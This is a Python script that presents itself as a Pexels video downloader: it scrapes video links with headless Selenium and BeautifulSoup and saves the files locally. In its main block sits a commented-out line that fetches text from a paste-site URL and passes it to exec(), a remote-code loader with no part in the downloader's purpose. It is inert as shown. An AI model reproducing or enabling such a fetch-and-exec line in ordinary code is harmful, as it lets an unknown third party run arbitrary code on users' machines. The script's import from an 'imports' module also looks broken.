import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from requests import get
import requests
from bs4 import BeautifulSoup
from itertools import islice

from imports import time, webdriver, ChromeDriverManager, requests

# specify the URL of the archive here
url = "https://www.pexels.com/search/videos/laxury/?orientation=portrait&size=large"
video_links = []

#getting all video links
def get_video_links():
    options = webdriver.ChromeOptions()
    options.add_argument("--lang=en")
    options.add_argument('--headless')
    options.add_experimental_option(
            'excludeSwitches', ['enable-logging'])
    browser = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
    browser.maximize_window()
    time.sleep(2)
    browser.get(url)
    time.sleep(5)

    vids = input("How many videos you want to download? 1-24")

    soup = BeautifulSoup(browser.page_source, 'lxml')
    links = soup.findAll("source")
    for link in islice(links, int(vids)):
        video_links.append(link.get("src"))

    return video_links

#download all videos
def download_video_series(video_links):
    # songs = input("How many songs you have? ")
    i=1
    for link in video_links:
   # iterate through all links in video_links
    # and download them one by one
    #obtain filename by splitting url and getting last string
        fn = link.split('/')[-1]  
        file_name = fn.split("?")[0]
        print ("Downloading video: %s"%file_name)

        #create response object
        r = requests.get(link, stream = True)
 
        #download started
        with open('downloads/'+file_name, 'wb') as f:
            for chunk in r.iter_content(chunk_size = 1024*1024):
                if chunk:
                    f.write(chunk)
    
        print ("%s downloaded!"%file_name)
        i+=1



if __name__ == "__main__":
    # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
  #getting all video links
    video_links = get_video_links()

  #download all videos
    download_video_series(video_links)
